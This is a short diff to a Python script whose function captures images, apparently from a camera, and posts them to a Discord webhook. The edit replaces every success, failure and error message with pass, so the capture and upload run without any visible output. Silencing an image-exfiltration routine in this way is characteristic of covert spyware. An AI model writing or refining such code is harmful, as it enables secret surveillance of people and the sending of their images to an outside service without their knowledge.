@@ -51,10 +51,10 @@ def capture_and_send_to_discord(webhook_url):
         try:
             response = requests.post(webhook_url, files=files, data={"payload_json": json.dumps(payload)})
             if response.status_code == 200:
-                print("Image successfully sent to Discord")
+                pass
             else:
-                print(f"Failed to send image. Status code: {response.status_code}")
+                pass
         except Exception as e:
-            print(f"Error sending image: {str(e)}")
+            pass
     cap.release()
 capture_and_send_to_discord(webhook_url)
